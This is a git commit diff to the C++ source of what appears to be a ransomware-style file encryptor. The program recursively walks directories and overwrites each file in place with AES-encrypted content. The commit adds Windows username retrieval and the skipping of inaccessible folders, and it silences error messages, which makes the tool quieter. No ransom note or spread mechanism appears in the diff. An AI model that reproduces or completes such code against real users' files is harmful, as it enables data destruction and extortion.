caf0911d0047e3fa6789024e9ca3e9e76177b893
ng0cph0ng <fogsbuddha@gmail.com>
2024-04-27 07:29:34 +0700

    function

--- src/function.cpp
+++ src/function.cpp
@@ -4,15 +4,26 @@
 #include <vector>
 #include <filesystem>
 #include <random>
+#include <windows.h>
+#include <lmcons.h>
 #include "AES_128_CBC.h"
 
 namespace fs = std::filesystem;
 
-const int SIZE = 16;
+const int size = 16;
 
 const std::string keyFilename = "key.txt";
 const std::string ivFilename = "iv.txt";
 
+//This function is used to retrieve the username.
+std::string getCurrentUsername() {
+    char username[UNLEN + 1];
+    DWORD username_len = UNLEN + 1;
+    GetUserNameA(username, &username_len);
+    return std::string(username);
+}
+
+//This function is used to generate a random key and IV
 void generateKeyAndIV(uint8_t *key, uint8_t *iv, int size)
 {
     std::random_device rd;
@@ -28,6 +39,7 @@ void generateKeyAndIV(uint8_t *key, uint8_t *iv, int size)
     }
 }
 
+//This function is used to save data to a file.
 void saveToFile(const std::string &filename, const uint8_t *data, int size)
 {
     std::ofstream file(filename, std::ios::binary);
@@ -38,6 +50,7 @@ void saveToFile(const std::string &filename, const uint8_t *data, int size)
     }
 }
 
+//This function is used to read data from a file.
 void readFromFile(const std::string &filename, uint8_t *data, int size)
 {
     std::ifstream file(filename, std::ios::binary);
@@ -48,34 +61,48 @@ void readFromFile(const std::string &filename, uint8_t *data, int size)
     }
 }
 
+//This function is used to check whether a file exists or not.
 bool filesExist(const std::string &file1, const std::string &file2)
 {
     return (fs::exists(file1) && fs::exists(file2));
 }
 
+//This function is used to check if a file doesn't exists , it will generate key and IV.
 void genKeyIfNeeded(uint8_t *key, uint8_t *iv)
 {
     if (!filesExist(keyFilename, ivFilename))
     {
-        generateKeyAndIV(key, iv, SIZE);
-        saveToFile(keyFilename, key, SIZE);
-        saveToFile(ivFilename, iv, SIZE);
+        generateKeyAndIV(key, iv, size);
+        saveToFile(keyFilename, key, size);
+        saveToFile(ivFilename, iv, size);
     }
 }
 
+//Declare the FileItem struct.
 struct FileItem
 {
     std::string name;
     bool isDirectory;
 };
 
-std::vector<FileItem> listFilesAndDirectories(const std::string &path)
+//This function is used to list files and directories.
+std::vector<FileItem> listFilesAndDirectories(const std::string &path, bool skipNonAccessible = false)
 {
     std::vector<FileItem> result;
     try
     {
         for (const auto &entry : fs::directory_iterator(path))
         {
+            if (skipNonAccessible) {
+                try {
+                    fs::directory_iterator test(entry.path());
+                }
+                catch(const std::exception& e) {
+                    //std::cerr << "Error opening directory: " << entry.path().string() << std::endl;
+                    continue; // Skip this iteration and move to the next one
+                }
+            }
+
             if (fs::is_directory(entry.path()))
             {
                 result.push_back({entry.path().filename().string(), true});
@@ -88,12 +115,12 @@ std::vector<FileItem> listFilesAndDirectories(const std::string &path)
     }
     catch (const fs::filesystem_error &e)
     {
-        std::cerr << "Error: " << e.what() << std::endl;
+        //std::cerr << "Error: " << e.what() << std::endl;
     }
     return result;
 }
 
-// Function to increase the size of a string to the nearest multiple of 16
+//This function is used to increase the size of a string to the nearest multiple of 16.
 std::string increaseSizeofString(const std::string &input)
 {
     size_t currentSize = input.size();
@@ -105,7 +132,7 @@ std::string increaseSizeofString(const std::string &input)
     return input;
 }
 
-// Function to read the content of a file into a single string
+//This function is used to read the content of a file into a single string.
 std::string readFiles(const std::string &filePath)
 {
     std::ifstream file(filePath, std::ios::binary);
@@ -131,6 +158,7 @@ std::string readFiles(const std::string &filePath)
     return fileContent;
 }
 
+//This function is used to encrypt files.
 void enc(const std::vector<FileItem> &items, const std::string &prefix, const std::string &currentPath, const uint8_t *key, const uint8_t *iv)
 {
     for (const auto &item : items)
@@ -144,9 +172,9 @@ void enc(const std::vector<FileItem> &items, const std::string &prefix, const st
         else
         {
             std::string fileContent = readFiles(currentPath + item.name);
-            int size = fileContent.size();
-            uint8_t data[size];
-            for (size_t i = 0; i < size; i++)
+            int fileSize = fileContent.size();
+            std::vector<uint8_t> data(fileSize);
+            for (size_t i = 0; i < fileSize; i++)
             {
                 data[i] = static_cast<uint8_t>(fileContent[i]);
             }
@@ -154,15 +182,16 @@ void enc(const std::vector<FileItem> &items, const std::string &prefix, const st
             AES_CTX ctx;
             AES_EncryptInit(&ctx, key, iv);
 
-            for (unsigned int offset = 0; offset < size; offset += 16)
+            for (unsigned int offset = 0; offset < fileSize; offset += 16)
             {
-                AES_Encrypt(&ctx, data + offset, data + offset);
+                AES_Encrypt(&ctx, data.data() + offset, data.data() + offset);
             }
-            saveToFile(currentPath + item.name, data, sizeof(data));
+            saveToFile(currentPath + item.name, data.data(), fileSize);
         }
     }
 }
 
+//This function is used to decrypt files.
 void dec(const std::vector<FileItem> &items, const std::string &prefix, const std::string &currentPath, const uint8_t *key, const uint8_t *iv)
 {
     for (const auto &item : items)
@@ -176,9 +205,9 @@ void dec(const std::vector<FileItem> &items, const std::string &prefix, const st
         else
         {
             std::string fileContent = readFiles(currentPath + item.name);
-            int size = fileContent.size();
-            uint8_t data[size];
-            for (size_t i = 0; i < size; i++)
+            int fileSize = fileContent.size();
+            std::vector<uint8_t> data(fileSize);
+            for (size_t i = 0; i < fileSize; i++)
             {
                 data[i] = static_cast<uint8_t>(fileContent[i]);
             }
@@ -186,11 +215,11 @@ void dec(const std::vector<FileItem> &items, const std::string &prefix, const st
             AES_CTX ctx;
             AES_DecryptInit(&ctx, key, iv);
 
-            for (unsigned int offset = 0; offset < size; offset += 16)
+            for (unsigned int offset = 0; offset < fileSize; offset += 16)
             {
-                AES_Decrypt(&ctx, data + offset, data + offset);
+                AES_Decrypt(&ctx, data.data() + offset, data.data() + offset);
             }
-            saveToFile(currentPath + item.name, data, sizeof(data));
+            saveToFile(currentPath + item.name, data.data(), fileSize);
         }
     }
 }
